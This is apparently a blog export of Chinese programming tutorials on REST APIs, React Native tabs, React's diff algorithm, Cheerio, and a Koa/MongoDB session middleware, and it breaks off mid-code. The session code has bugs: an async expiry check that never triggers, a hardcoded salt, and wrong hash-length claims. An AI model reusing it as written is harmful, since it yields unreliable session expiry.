RESTful。 RestFul 架构： 每一个 URI 代表一种资源 客户端和服务器之间，传递这种资源的某种表现层 客户端通过四个 HTTP 动词，对服务器端资源进行操作，实现”表现层状态转化” 注：这里概念比较难懂，最好去看 Github 的 RestFul Api 设计，涨涨知识：https://developer.github.com/v3/ 区别先来看看非 REST FUL 风格的 API 与 REST FUL 风格 API 有哪些区别？主要体现在动词的简化，依赖于 HTTP Method 来表达。 1234567891011非 REST FUL 风格http://127.0.0.1/user/query/1 GET 根据用户 id 查询用户数据http://127.0.0.1/user/save POST 新增用户http://127.0.0.1/user/update POST 修改用户信息http://127.0.0.1/user/delete GET/POST 删除用户信息REST FUL 风格http://127.0.0.1/user/1 GET 根据用户 id 查询用户数据http://127.0.0.1/user POST 新增用户http://127.0.0.1/user PUT 修改用户信息http://127.0.0.1/user DELETE 删除用户信息 资源所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。资源总要通过某种载体反应其内容，文本可以用 txt 格式表现，也可以用 HTML 格式、XML 格式表现，甚至可以采用二进制格式；图片可以用 JPG 格式表现，也可以用 PNG 格式表现，JSON 是现在最常用的资源表示格式。 资源是以 json（或其他 Representation）为载体的、面向用户的一组数据集，资源对信息的表达倾向于概念模型中的数据： 资源总是以某种 Representation 为载体显示的，即序列化的信息。 常用的 Representation 是 json 或者 xml 等。 Representation 是REST架构的表现层。 URI可以用一个 URI（统一资源定位符）指向资源，即每个 URI 都对应一个特定的资源。要获取这个资源，访问它的 URI 就可以，因此 URI 就成了每一个资源的地址或识别符。 一般的，每个资源至少有一个 URI 与之对应，最典型的 URI 即 URL 。 无状态所谓无状态的，即所有的资源，都可以通过URI定位，而且这个定位与其他资源无关，也不会因为其他资源的变化而改变。 认证机制由于 RESTful 风格的服务是无状态的，认证机制尤为重要。常用的认证机制包括 session auth（即通过用户名密码登录），basic auth，token auth 和 OAuth，服务开发中常用的认证机制为后三者。 Basic Auth 简言之，Basic Auth 是配合 RESTful API 使用的最简单的认证方式，只需提供用户名密码，在每次 http 请求时都带上即可，但由于有把用户名密码暴露给第三方客户端的风险，在生产环境下被使用的越来越少。因此，在开发对外开放的 RESTful API 时，尽量避免采用 Basic Auth。 Token Auth Token Auth并不常用，它与 Basic Auth 的区别是，不将用户名和密码发送给服务器做用户认证，而是向服务器发送一个事先在服务器端生成的 Token 来做认证。因此 Token Auth 要求服务器端要具备一套完整的 Token 创建和管理机制。 OAuth OAuth（开放授权）是一个开放的授权标准，允许用户让第三方应用访问该用户在某一 web 服务上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用。OAuth 允许用户提供一个令牌，而不是用户名和密码来访问他们存放在特定服务提供者的数据。每一个令牌授权一个特定的第三方系统（例如，视频编辑网站)在特定的时段（例如，接下来的2小时内）内访问特定的资源（例如仅仅是某一相册中的视频）。这样，OAuth 让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息，而非所有内容。正是由于 OAUTH 的严谨性和安全性，现在 OAUTH 已成为 RESTful 架构风格中最常用的认证机制，和 RESTful 架构风格一起，成为企业级服务的标配。 概念下面列出一些概念性内容。 协议：API与用户的通信协议，总是使用HTTP/HTTPS协议。 域名：应该尽量将 API 部署在专用域名之下。 12https://api.example.comhttps://example.org/api/ 版本：应该将 API 的版本号放入 URL。 1234https://api.example.com/v1/// 类似的知乎日报 APIhttps://news-at.zhihu.com/api/4/story/9129166 路径：路径又称”终点”（endpoint），表示 API 的具体网址。 在 RESTful 架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的”集合”（collection），所以API中的名词也应该使用复数。 123https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/employees HTTP 动词对于资源的具体操作类型，由 HTTP 动词表示。常用的 HTTP 动词有下面五个（括号里是对应的 SQL 命令） method content GET（SELECT） 从服务器取出资源（一项或多项） POST（CREATE） 在服务器新建一个资源 PUT（UPDATE） 在服务器更新资源（客户端提供改变后的完整资源） PATCH（UPDATE） 在服务器更新资源（客户端提供改变的属性） DELETE（DELETE） 从服务器删除资源 下面是一些例子： mothed url content GET /zoos 列出所有动物园 POST /zoos 新建一个动物园 GET /zoos/id 获取某个指定动物园的信息 PUT /zoos/id 更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/id 更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/id 删除某个动物园 GET /zoos/id/animals 列出某个指定动物园的所有动物 DELETE /zoos/id/animals/id 删除某个指定动物园的指定动物 过滤信息如果记录数量很多，服务器不可能都将它们返回给用户。API 应该提供参数，过滤返回结果。一些常见的参数： query content ?limit=10 指定返回记录的数量 ?offset=10 指定返回记录的开始位置。 ?page=2&amp;per_page=100 指定第几页，以及每页的记录数。 ?sortby=name&amp;order=asc 指定返回结果按照哪个属性排序，以及排序顺序。 ?animal_type_id=1 指定筛选条件 状态码服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的 HTTP 动词） 错误处理如果状态码是 4xx，就应该向用户返回出错信息。一般来说，返回的信息中将 error 作为键名，出错信息作为键值即可。 123&#123; error: \"Invalid API key\"&#125; 返回结果针对不同操作，服务器向用户返回的结果应该符合以下规范。 code name content GET /collection 返回资源对象的列表（数组） GET /collection/resource 返回单个资源对象 POST /collection 返回新生成的资源对象 PUT /collection/resource 返回完整的资源对象 PATCH /collection/resource 返回完整的资源对象 DELETE /collection/resource 返回一个空文档 Hypermedia APIRESTful API 最好做到 Hypermedia，即返回结果中提供链接，连向其他 API 方法，使得用户不查文档，也知道下一步应该做什么。 123456789101112131415&#123; \"link\": &#123; \"rel\": \"collection https://www.example.com/zoos\", \"href\": \"https://api.example.com/zoos\", \"title\": \"List of zoos\", \"type\": \"application/vnd.yourformat+json\" &#125;, \"meta\": &#123; \"limit\": 20, \"offset\": 60, \"total_count\": 439 \"next\": \"/api/v3/trochili/post/?limit=20&amp;post_type=article&amp;offset=80\", \"previous\": \"/api/v3/trochili/post/?limit=20&amp;post_type=article&amp;offset=40\", &#125;,&#125; 参考资料 https://blog.igevin.info/posts/restful-architecture-in-general/ http://www.ruanyifeng.com/blog/2014/05/restful_api.html","categories":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/categories/后端/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"}]},{"title":"React Native 实现悬浮的 Tabs","slug":"React Native/React Native 实现悬浮的 Tabs","date":"2017-07-21T15:45:17.000Z","updated":"2021-06-15T06:10:52.862Z","comments":true,"path":"/stories/2017/07/React Native/React Native 实现悬浮的 Tabs/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React Native/React Native 实现悬浮的 Tabs/","excerpt":"前言悬浮的 Tab 有两个部分组成，一个是 Tabs，一个是视觉差。视觉差需要使用一个 ScrollView， Tabs 里也会有一个 ScrollView，这样的嵌套在 React Native 里会造成滚动事件的冲突 ……","text":"前言悬浮的 Tab 有两个部分组成，一个是 Tabs，一个是视觉差。视觉差需要使用一个 ScrollView， Tabs 里也会有一个 ScrollView，这样的嵌套在 React Native 里会造成滚动事件的冲突 …… 实现原理在 React Native 里有一个问题，就是多个 ScrollView 嵌套时会导致子 ScrollView 的滚动条无效，也就是无法滚动子 ScrollView。这时为了能够滚动子 ScrollView，只能把父 ScrollView 的 scrollEnabled 设置为 false，也就是禁用父 ScrollView 的滚动条。 当父滚动条滚动到底部时，也就是已经走到可视窗的尽头时，禁用父 ScrollView 的滚动条，这时子 ScrollView 变成可滚动。 当子 ScrollView 滚动到顶部时，此时启用 ScrollView 的滚动条，这时切换为父 ScrollView 可滚动。 关于视觉差使用的是 react-native-parallax-scroll 这个视觉库，具体看文档。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, Text, View, Dimensions, Image, ScrollView,&#125; from 'react-native';import ParallaxScroll from 'react-native-parallax-scroll';import &#123; TabView, TabBar, SceneMap &#125; from 'react-native-tab-view';import rot from 'reactotron-react-native';const window = Dimensions.get('window');export default class App extends Component &#123; image = 'http://img.mp.itc.cn/upload/20170511/f408e12148724b56b8980282df2f45f2_th.jpg'; state = &#123; index: 0, routes: [ &#123; key: 'first', title: '我的音乐' &#125;, &#123; key: 'second', title: '我的钱包' &#125;, ], scrollEnabled: true, &#125;; renderTab = () =&gt; ( &lt;ScrollView contentContainerStyle=&#123;&#123; backgroundColor: '#f2f3f4' &#125;&#125; overScrollMode='never' scrollEventThrottle=&#123;2&#125; showsVerticalScrollIndicator=&#123;false&#125; style=&#123;&#123; flex: 1 &#125;&#125; onScrollBeginDrag=&#123;e =&gt; &#123; if (e.nativeEvent.contentOffset.y === 0) &#123; this.setState(&#123; scrollEnabled: true &#125;); &#125; &#125;&#125; onScroll=&#123;e =&gt; &#123; if (e.nativeEvent.contentOffset.y &lt;= 1) &#123; this.setState(&#123; scrollEnabled: true &#125;); // 父级可滚动 &#125; &#125;&#125;&gt; &#123;[...new Array(50)].map((item, index) =&gt; ( &lt;Text key=&#123;index&#125; style=&#123;&#123; padding: 12, textAlign: 'center' &#125;&#125;&gt; &#123;index + 1&#125; &lt;/Text&gt; ))&#125; &lt;/ScrollView&gt; ) render() &#123; return ( &lt;ParallaxScroll ref=&#123;s =&gt; this.scrollView = s&#125; style=&#123;&#123; flex: 1 &#125;&#125; overScrollMode='never' scrollEnabled=&#123;this.state.scrollEnabled&#125; showsVerticalScrollIndicator=&#123;false&#125; showsHorizontalScrollIndicator=&#123;false&#125; // 这里设置为手离开时才判断 onScrollEndDrag=&#123;e =&gt; &#123; const offsetY = e.nativeEvent.contentOffset.y; const contentSizeHeight = e.nativeEvent.contentSize.height; const oriageScrollHeight = e.nativeEvent.layoutMeasurement.height; if (offsetY + oriageScrollHeight &gt;= contentSizeHeight) &#123; this.setState(&#123; scrollEnabled: false &#125;); // 父级不可滚动 &#125; &#125;&#125; // 上面是 scrollview 的 props // 头高度 headerHeight=&#123;40&#125; // 是否是悬浮 isHeaderFixed=&#123;true&#125; // 视觉差高度 parallaxHeight=&#123;240&#125; // 头部背景颜色 headerBackgroundColor='transparent' // 头部浮动之后的背景颜色 headerFixedBackgroundColor='transparent' // 视觉差背景内容 renderParallaxBackground=&#123;() =&gt; ( &lt;Image source=&#123;&#123; uri: this.image &#125;&#125; resizeMode='cover' style=&#123;&#123; width: '100%', height: '100%' &#125;&#125; /&gt; )&#125;&gt; &#123;/* 这里是内容区 */&#125; &lt;TabView style=&#123;&#123; height: window.height - 24 &#125;&#125; navigationState=&#123;this.state&#125; useNativeDriver=&#123;true&#125; renderTabBar=&#123;props =&gt; ( &lt;TabBar &#123;...props&#125; indicatorStyle=&#123;styles.indicatorStyle&#125; style=&#123;styles.tabStyle&#125; labelStyle=&#123;styles.labelStyle&#125; /&gt; )&#125; onIndexChange=&#123;index =&gt; this.setState(&#123; index &#125;)&#125; renderScene=&#123;SceneMap(&#123; first: this.renderTab, second: this.renderTab, &#125;)&#125; /&gt; &lt;/ParallaxScroll&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, justifyContent: 'center', alignItems: 'center', backgroundColor: '#fff', &#125;, indicatorStyle: &#123; backgroundColor: '#39f', width: 30, left: window.width / 4 - 30 / 2 &#125;, tabStyle: &#123; backgroundColor: '#fff', height: 45, padding: 0, elevation: 0.2, &#125;, labelStyle: &#123; color: '#333', margin: 0, marginTop: 5 &#125;&#125;); 对于其他类似的效果，也是如此。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React 中的 DIFF 算法","slug":"React/React/React 中的 DIFF 算法","date":"2017-07-21T09:41:14.000Z","updated":"2021-06-15T06:10:52.877Z","comments":true,"path":"/stories/2017/07/React/React/React 中的 DIFF 算法/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React/React/React 中的 DIFF 算法/","excerpt":"React Diff 算法React 最精髓的地方，那就是它的虚拟 Dom Diff 算法。传统的 Diff 算法复杂高达 O(n^3)：http://grfia.dlsi.ua.es/ml/algorithms/references/editsurvey_bille.pdfReact 利用了 Dom 的特点对传统的 Diff 算法，进行优化，最后得出了一个复杂度只有 O(n) 的 Diff 算法。（只限于 Dom）下面讲述，React 的 Diff 算法的核心思想（翻译官方说明：https://facebook.github.io/react/docs/reconciliation.html）。","text":"React Diff 算法React 最精髓的地方，那就是它的虚拟 Dom Diff 算法。传统的 Diff 算法复杂高达 O(n^3)：http://grfia.dlsi.ua.es/ml/algorithms/references/editsurvey_bille.pdfReact 利用了 Dom 的特点对传统的 Diff 算法，进行优化，最后得出了一个复杂度只有 O(n) 的 Diff 算法。（只限于 Dom）下面讲述，React 的 Diff 算法的核心思想（翻译官方说明：https://facebook.github.io/react/docs/reconciliation.html）。 动机计算将一棵树转换成另一棵树的最小操作数是一个复杂的、研究成熟的问题。传统的算法计算这个问题大约是 O(n^3) 的复杂度，其中 n 是树种节点的数量。 这意味着显示1000个节点就需要大概要10亿次的比较，对于我们使用 React 的情形来说来说，代价太大了。要正确地认识这个数字，我们要知道现在的 CPU 一秒钟大概能执行 30 亿条指令。所以即使我们用性能最优的实现，我们也不能在一秒钟之内计算出 diff。 由于找不到最优的算法，我们基于两个假设的启发下实现了一个非最优的 O(n) 算法： 两个相同类的组件将会产生相似的树，而两个不同类的组件将会产生不同的树。 为多次渲染中稳定存在的元素分配一个唯一的 key 是可选的。 在实践中我们发现，对于几乎所有的案例这些假设都不可思议的快。 逐对的 diff要对树做 diff，我们首先要对两个节点进行 diff。节点的 diff 有三种情况： 节点有不同的类型。 相同类型的 DOM 节点。 相同类型的自定义组件。 节点有不同的类型如果节点的类型（type）不同，React 会认为他们是两颗不同的子树（没有比较的必要），摒弃之前的，然后生成、插入新的节点。 123renderA: &lt;div /&gt;renderB: &lt;span /&gt;=&gt; [removeNode &lt;div /&gt;], [insertNode &lt;span /&gt;] 对于自定义组件来说也是一样的逻辑。如果组件是不同的类型，渲染时 React 不会尝试去匹配它们，直接从 DOM 中移除原有的节点再插入新节点。 123renderA: &lt;Header /&gt;renderB: &lt;Content /&gt;=&gt; [removeNode &lt;Header /&gt;], [insertNode &lt;Content /&gt;] 这个进阶知识点是 React 的 diff 算法既快又精准的一个非常重要的方面。它为快速裁剪树中大的部分、快速聚焦到可能相似的部分提供了非常好的启发。 &lt;Header&gt;元素生成的 DOM 树不太可能和一个&lt;Content&gt;元素相似。所以 React 没有花时间去尝试匹配两棵树，而是重新渲染一棵树。 可以推论的是，如果在两次 render 之间的相同位置都有一个&lt;Header&gt;，很有可能会出现相似的树，这种情况就值得去匹配。 相同类型的 DOM 节点当比较两个 DOM 节点时，我们会查看两个节点的 attributes 然后决定哪个可以在线性时间内改变。 123renderA: &lt;div id='before' /&gt;renderB: &lt;div id='after' /&gt;=&gt; [replaceAttribute id 'after'] 样式方面我们没有使用难以理解的字符串，而是使用一个键-值对的对象。这样我们仅仅更新改变过的属性就可以了。 123renderA: &lt;div style=&#123;&#123; color: 'red' &#125;&#125; /&gt;renderB: &lt;div style=&#123;&#123; fontWeight: 'bold' &#125;&#125; /&gt;=&gt; [removeStyle color], [addStyle font-weight 'bold'] attributes 更新之后，我们会递归地更新所有子节点。 相同类型的自定义组件如果两个自定义组件的类型是相同的，由于组件是有状态的，不能简单地直接用新建组件。React 会把所有新建组件的 attributes 传递给原有组件，然后调用原有组件的componentWillReceiveProps()和componentWillUpdate()。原有组件现在就是可以操作的了。它的 render() 方法会被调用，diff 算法被应用在新的结果和旧的结果上。 逐列表的 diff问题案例为了做子节点的更新，React 采用了非常简单的方法。它同时遍历子节点的列表，一旦有变化就生成一个修改。例如，你可以在后面插入一个元素： 123renderA: &lt;div&gt;&lt;span&gt;first&lt;/span&gt;&lt;/div&gt;renderB: &lt;div&gt;&lt;span&gt;first&lt;/span&gt;&lt;span&gt;second&lt;/span&gt;&lt;/div&gt;=&gt; [insertNode &lt;span&gt;second&lt;/span&gt;] 在前面插入一个元素就可能出问题，React 会认为两个节点都是 span，然后进入修改模式：（先替换，再插入） 123renderA: &lt;div&gt;&lt;span&gt;first&lt;/span&gt;&lt;/div&gt;renderB: &lt;div&gt;&lt;span&gt;second&lt;/span&gt;&lt;span&gt;first&lt;/span&gt;&lt;/div&gt;=&gt; [replaceAttribute textContent 'second'], [insertNode &lt;span&gt;first&lt;/span&gt;] 有很多算法试图找到转换元素列表需要的最小操作集合。莱文斯坦距离能通过元素插入、删除和替换在 O(n^2) 的复杂度下找到最小集合。但即使我们使用莱文斯坦距离，当一个节点移动到另一个地方时，算法也找不出来，如果要使用算法找出这类节点复杂度就更高了。 key 属性为了解决这个看似难以解决的问题，我们引入了一个新的可选属性 key。你可以为每个子节点分配一个用于匹配的 key。如果你指定了一个 key，React 就能够用哈希表在 O(n) 的复杂度内完成插入，删除，替换和移动。 123renderA: &lt;div&gt;&lt;span key='first'&gt;first&lt;/span&gt;&lt;/div&gt;renderB: &lt;div&gt;&lt;span key='second'&gt;second&lt;/span&gt;&lt;span key='first'&gt;first&lt;/span&gt;&lt;/div&gt;=&gt; [insertNode &lt;span&gt;second&lt;/span&gt;] 在实践中，找一个 key 是不难的。大部分情况下，你要显示的元素已经有了一个唯一的 id。如果没有，你可以通过添加一个新的 id 属性，或者哈希部分内容来生成一个 key。注意 key 只需要对相邻兄弟节点唯一，不需要全局唯一。 权衡要注意的是调解算法是一个实现细节的算法。React 可以对每一个 action（动作）都重新渲染整个 app，得到的结果也会相同。为了让常规应用场景运行的更快，我们会定期的优化启发算法。 在当前的实现中，你可以通过 key 表明一颗子树在相邻节点间移动了，但是你如果你移动到其他地方（非相邻节点）key 的作用就失效了，这种情况下算法将会重新渲染整个子树。 因为我们依赖于两个启发，所以如果背后的假设失效了，性能就会大打折扣。 调度算法不会尝试去匹配不同组件类的树。如果你的两个组件有非常相似的输出，最好是写成同一个组件。在实践中，我们也没有发现这样会出问题。 key 应当是稳定存在、可预测和唯一的。不稳定的键（比如通过 Math.random() 生成的）将会导致不必要地重新创建许多节点，而这将进一步引发性能退化、子组件里面的 state 丢失。 参考资料 https://swenyang.gitbooks.io/translation/content/react/diff-algorithm.html","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Native 使用 Cheerio","slug":"React Native/React Native 使用 Cheerio.js","date":"2017-07-20T10:59:26.000Z","updated":"2021-06-15T06:10:52.860Z","comments":true,"path":"/stories/2017/07/React Native/React Native 使用 Cheerio.js/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/React Native/React Native 使用 Cheerio.js/","excerpt":"在 React Native 上使用 CheerioCheerio 是 Nodejs 的一个非常优秀的 DOM/XML 解析库，它是最小型的 JQuery 的实现，能够轻松的解析抓取到的 DOM 数据，并且有着与 JQuery 兼容的 API。但是，我想在 React Native 上使用，很不幸失败了。在找不到解决方案时（在 Cheerio 的 issue 搜索了，没人提 React Native），随后我向 Cheerio 提了一个 issue：https://github.com/cheeriojs/cheerio/issues/1058 然而，等了好久都没人回答。","text":"在 React Native 上使用 CheerioCheerio 是 Nodejs 的一个非常优秀的 DOM/XML 解析库，它是最小型的 JQuery 的实现，能够轻松的解析抓取到的 DOM 数据，并且有着与 JQuery 兼容的 API。但是，我想在 React Native 上使用，很不幸失败了。在找不到解决方案时（在 Cheerio 的 issue 搜索了，没人提 React Native），随后我向 Cheerio 提了一个 issue：https://github.com/cheeriojs/cheerio/issues/1058 然而，等了好久都没人回答。 后来尝试，寻找错误的地方。发现，是一个叫：htmlparser2的库出错了。在之前已经有人爬过坑了，在 htmlparser2 的 issue 找到了问题： Install fail on React Native 错误的原因是：htmlparser2 使用了 Nodejs 的一些流（stream）API，而 React Native 并不具有 Nodejs 的环境（API）。 最后，有人提供的解决方案是使用 htmlparser2-without-node-native htmlparser2-without-node-nativehtmlparser2 build that excludes node native modules so that you can use it in platforms like React Native. Remove Stream and WritableStream.（删除 Stream APi） Use eventemitter2 instead of native events. （使用 eventemitter2） 但是，这是 htmlparser2 在 React Native 上的解决方案，那么如何在 React Native 上使用 Cheerio。 恰好，htmlparser2-without-node-native 的作者，封装了一个：cheerio-without-node-native （可能他也想要在 React Native 上使用 Cheerio） 注意：它使用 Cheerio 的版本是 0.20.0 ，现在 Cheerio 的版本是 0.22.0，API 差异不是太多，不影响使用。 使用 cheerio-without-node-native安装： 1npm install --save cheerio-without-node-native 基本使用： 123456789101112131415161718192021222324252627import React, &#123; Component &#125; from 'react';import &#123; StyleSheet, View, Text &#125; from 'react-native';import cio from 'cheerio-without-node-native';export default class App extends Component &#123; constructor(props) &#123; super(props); this.$ = cio.load('&lt;p class=\"hello\" style=\"color: red\"&gt;Hello world&lt;/p&gt;'); &#125; render() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Text style=&#123;styles.text&#125;&gt;&#123;this.$('.hello').text()&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.text&#125;&gt;&#123;this.$('.hello').attr('style')&#125;&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, backgroundColor: '#fff', &#125;, text: &#123; fontSize: 30 &#125;&#125;); 参考资料 https://github.com/cheeriojs/cheerio","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs 基于 Mongodb 的 Session 会话管理","slug":"Nodejs/Nodejs 基于 Mongodb 的 Session 管理","date":"2017-07-16T11:53:10.000Z","updated":"2021-06-15T06:10:52.839Z","comments":true,"path":"/stories/2017/07/Nodejs/Nodejs 基于 Mongodb 的 Session 管理/","link":"","permalink":"http://me.lizhooh.com/stories/2017/07/Nodejs/Nodejs 基于 Mongodb 的 Session 管理/","excerpt":"Mongodb 存储 SessionSession又称为会话状态，是 Web 系统中最常用的状态，用于维护和当前浏览器实例相关的一些信息。我们控制用户去权限中经常用到 Session 来存储用户状态。 对于 Session 的存储，最简单粗暴而速度最快的是直接存储在内存里（缺点是占用内存并且进程挂了，所有的 Session 将会丢失），相对的还可以存储在redis, mysql, mongodb等数据库里。 在 Nodejs 里的一些 Session 中间件，它们的数据都是存储在内存里的，下面通过自定义 Session 中间件，把数据储存在 Mongodb 里。（github 上已经有很好的 session-mongodb 中间件，不过自己实现一次还是很不错的）","text":"Mongodb 存储 SessionSession又称为会话状态，是 Web 系统中最常用的状态，用于维护和当前浏览器实例相关的一些信息。我们控制用户去权限中经常用到 Session 来存储用户状态。 对于 Session 的存储，最简单粗暴而速度最快的是直接存储在内存里（缺点是占用内存并且进程挂了，所有的 Session 将会丢失），相对的还可以存储在redis, mysql, mongodb等数据库里。 在 Nodejs 里的一些 Session 中间件，它们的数据都是存储在内存里的，下面通过自定义 Session 中间件，把数据储存在 Mongodb 里。（github 上已经有很好的 session-mongodb 中间件，不过自己实现一次还是很不错的） 会话管理基于 Cookie + Session 的会话管理在 Web 上非常普遍。Cookie + Session 的用户认证一般都是这样： 后端需要维护的一个store，用来储存session的数据（数据库存储，内存缓存）。 在第一次登录时会创建一个新的session，并产生一个sid，这个sid将会通过请求响应存储在浏览器cookie的sid里，下次（前端）发出请求时，http 里的cookie就会携带这个字段，此时服务器通过cookie sid映射到session sid来找到存储中的session数据关联起来。 在已经登录过一次后，会维持一个会话状态（一般为 30 分钟），通过cookie sid映射到session sid，来找到session.user中的数据从而判断，用户是否登录过。如果发现会话生命周期结束了，那就把session.user置空或删除，并返回超时登录页面。 在注销时，也是通过sid来找到session.user信息，然后把session.user置空或删除。 所以，自定义 Session 中间件，只需要做到 Session，Cookie 的 CURD 就可以了。 Session Action在这里，Session 有几个动作： 创建 Session 查找 Session 检测 session 销毁 Session 那么对应的代码结构： 1234567891011121314151617181920212223242526class Session &#123; /** * 根据 userid 创建 session 数据并存储 * @param&#123;Number&#125; userid: 用户 id * @returns&#123;String&#125; sid */ async create(userid) &#123;&#125; /** * 根据 sid 寻找 session 数据，返回 userid * @param&#123;String&#125; sid: session id * @returns&#123;Object&#125; null 表示找不到，false 表示过期，成功返回 userid */ async find(sid) &#123;&#125; /** * 根据 createTime 检查是否 session 数据是否过期，返回 false 表示过期 * @param&#123;Date&#125; createTime: session 创建时间 * @returns&#123;Boolean&#125; */ async exceed(createTime) &#123;&#125; /** * 根据 sid 寻找 session 数据并删除，返回 userid * @param&#123;String&#125; sid: session id * @returns&#123;Object&#125; userid */ async delete(sid) &#123;&#125;&#125; Schema自定义 session 的数据结构，这部分需要根据业务的需求而定，一般比较简单的是只储存 sid 与 userid，还有 createTime。 123456// 存储的集合为 sessions，默认自带 _idnew Schema(&#123; sid: String, userid: Number, createTime: Date,&#125;, &#123; versionKey: false &#125;); sha1 加密使用 crypto 创建一个 sha1 加密函数，生成的是 32 位字符串。当然你也可以使用 sha256 来加密，生成的是 256 位长字符串。 123456function sha1(userid, salt) &#123; return crypto .createHash('sha1') .update(userid + salt + Date.now()) .digest('base64');&#125; Session 类实现 session 的四个动作。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Session &#123; constructor(options = &#123;&#125;) &#123; // 默认参数 this._options = Object.assign(&#123; host: '127.0.0.1', post: 27017, user: null, password: null, db: 'test', collection: 'session', maxAge: 1000 * 60 * 60 * 24 * 7, // 7 天 &#125;, options); // 使用 mongoose 来连接 mongodb const &#123; host, post, db &#125; = this._options; mongoose.connect(`mongodb://$&#123;host&#125;:$&#123;post&#125;/$&#123;db&#125;`, &#123; useMongoClient: true, &#125;); this._db = mongoose.model('session', new Schema(&#123; sid: String, userid: Number, createTime: Date, &#125;, &#123; versionKey: false &#125;), this._options.collection); this._salt = \"how do you do ?\"; &#125; async create(userid) &#123; const sid = sha1(userid, this._salt); // 存储 const res = await this._db.update(&#123; userid &#125;, &#123; sid, userid, createTime: Date.now(), &#125;, &#123; upsert: true &#125;); // insert + update = save return sid; &#125; async find(sid) &#123; const res = await this._db.findOne(&#123; sid &#125;); if (res != null &amp;&amp; res.userid) &#123; if (this.exceed(res.createTime) === false) &#123; this.delete(sid); return false; &#125; return res.userid; &#125; return null; // 找不到 &#125; async exceed(createTime) &#123; return Date.now() - new Date(createTime).getTime() &lt; this._options.maxAge &#125; async delete(sid) &#123; const res = await this._db.remove(&#123; sid &#125;); return sid; &#125;&#125; 在构造函数里主要是做数据库连接与配置选项。 优化在这里使用的是外部对比创建时间的方法来检查用户认证是否过期，如果某个用户长久不登陆，这就意味着 session 就永久的存在数据库里，这是非常不好的。 在 Redis 中有可以为某个字段设置过期时间，由 redis 来检测是否过期，当过期时会被 redis 自动删除。 而在 MongoDB 有一种集合叫做time-to-live（TTL）集合，它也是可以设置过期时间的。 下面就为 createTime 字段设置过期时间，当且仅当当前时间与 createTime 相差超过预设值时，会自动被 MongoDB 删除。 12// 过期时间：30 天，单位是毫秒db.tokens.createIndex(&#123; createTime: 1 &#125;, &#123; expireAfterSeconds: 3600 * 24 * 30 &#125;); 这个命令 mongoose 没有提供 API，只能在 MongoDB 服务器上进行。它会在 createTime 上创建索引，MongoDB 会定期检查时间戳，与当前时间值比较，如果 createTime 与当前时间值的差大于 expireAfterSeconds 的值，那么就会删除这个文档。 那么检查过期时间的功能由 MongoDB 负责，去除 exceed 函数，代码将改为： 1234async find(sid) &#123; const res = await this._db.findOne(&#123; sid &#125;); return res; // 找不到&#125; 中间件中间件处理，主要是把 Session 类挂载到 response 里。 下面挂着到 Koa 的 ctx 对象里。 123456789// 中间件module.exports = (options) =&gt; &#123; const _session = new Session(options); return async function (ctx, next) &#123; ctx.session = _session; await next(); &#125;&#125; 使用： 12const session = require('./session');app.use(session()); 实践下面是一个有登录，注销的模块示例，使用 koa2 搭建的后端： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970const Koa = require('koa');const Router = require('koa-router');const render = require('koa-art-template');const path = require('path');const app = new Koa();const router = new Router();render(app, &#123; root: path.join(__dirname, 'views'), // views 路径 extname: '.html', debug: process.env.NODE_ENV !== 'production'&#125;);// 自定义用户认证中间件const auth = () =&gt; async (ctx, next) =&gt; &#123; const sid = ctx.cookies.get('sid'); if (sid !== undefined) &#123; const res = await ctx.session.find(sid); if (res === null || res === false) &#123; ctx.cookies.set('sid', undefined); return ctx.render('index'); &#125; &#125; else &#123; // 访问 login 时，不用重定向 if (ctx.url === '/login') return await next(); return ctx.render('index'); &#125; await next();&#125;router .get('/', async ctx =&gt; &#123; await 